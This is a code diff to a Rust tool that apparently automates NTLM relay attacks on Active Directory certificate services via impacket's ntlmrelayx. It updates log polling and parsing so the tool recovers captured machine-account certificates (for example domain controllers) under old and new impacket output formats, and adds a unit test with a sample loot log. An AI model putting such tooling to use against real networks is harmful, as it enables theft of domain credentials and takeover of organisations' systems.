@@ -1043,11 +1043,12 @@ async fn poll_for_cert(relay_log: &Path, max: Duration, interval: Duration) -> b
     let deadline = Instant::now() + max;
     loop {
         if let Ok(s) = tokio::fs::read_to_string(relay_log).await {
-            // `--adcs` writes "GOT CERTIFICATE! ID <n>" then "Writing PKCS#12 …".
-            // `--ldap` userCertificate writes "Base64 certificate of user …".
-            if s.contains("Base64 certificate of user")
-                || s.contains("GOT CERTIFICATE!")
+            // `--adcs` writes "GOT CERTIFICATE! ID <n>" then "Writing PKCS#12 …",
+            // falling back to a base64 console dump when the file write fails.
+            if s.contains("GOT CERTIFICATE!")
                 || s.contains("Writing PKCS#12 certificate to")
+                || s.contains("Base64-encoded PKCS#12 certificate (")
+                || s.contains("Base64 certificate of user")
             {
                 return true;
             }
@@ -1139,22 +1140,32 @@ fn parse_relayed_user(line: &str) -> Option<String> {
     Some(candidate.to_string())
 }
 
-/// Parse the relay.log for the LAST captured cert. ntlmrelayx prints
-/// `Base64 certificate of user <NAME>` followed by the base64 blob on the
-/// next non-empty line. Returns (user, base64_blob).
+/// Parse the relay.log for the LAST captured cert, from the console fallback
+/// impacket takes when it cannot write the pfx to disk. Both spellings are
+/// accepted: `Base64-encoded PKCS#12 certificate (<NAME>):` since 0.12.0, and
+/// `Base64 certificate of user <NAME>` before it. Either way the base64 blob
+/// lands on the next non-empty line. Returns (user, base64_blob).
 fn extract_cert_from_log(log: &str) -> Option<(String, String)> {
+    const B64_MODERN: &str = "Base64-encoded PKCS#12 certificate (";
+    const B64_LEGACY: &str = "Base64 certificate of user ";
+
     let mut last_user: Option<String> = None;
     let mut last_b64: Option<String> = None;
     let mut pending_user: Option<String> = None;
 
     for line in log.lines() {
-        if let Some(idx) = line.find("Base64 certificate of user ") {
-            let after = &line[idx + "Base64 certificate of user ".len()..];
-            let name = after
-                .split_whitespace()
-                .next()
-                .unwrap_or("")
-                .trim_end_matches(':');
+        let named = line
+            .find(B64_MODERN)
+            .and_then(|i| line[i + B64_MODERN.len()..].split(')').next())
+            .or_else(|| {
+                line.find(B64_LEGACY).and_then(|i| {
+                    line[i + B64_LEGACY.len()..]
+                        .split_whitespace()
+                        .next()
+                        .map(|n| n.trim_end_matches(':'))
+                })
+            });
+        if let Some(name) = named {
             if !name.is_empty() {
                 pending_user = Some(name.to_string());
             }
@@ -1958,6 +1969,21 @@ MIIBlahSecondCert==\n\
         let (user, b64) = super::extract_cert_from_log(log).expect("should extract");
         assert_eq!(user, "DC2$");
         assert_eq!(b64, "MIIBlahSecondCert==");
+    }
+
+    #[test]
+    fn extract_cert_from_log_reads_impacket_0_13_console_fallback() {
+        // impacket >=0.12 renamed the marker and sanitises `$` out of the name.
+        let log = "\
+[*] GOT CERTIFICATE! ID 42\n\
+[*] Writing PKCS#12 certificate to /home/kali/loot/DC01.pfx\n\
+[*] Unable to write certificate to file, printing B64 of certificate to console instead\n\
+[*] Base64-encoded PKCS#12 certificate (DC01): \n\
+MIIBlahModernCert==\n\
+[*] done\n";
+        let (user, b64) = super::extract_cert_from_log(log).expect("should extract");
+        assert_eq!(user, "DC01");
+        assert_eq!(b64, "MIIBlahModernCert==");
     }
 
     #[test]
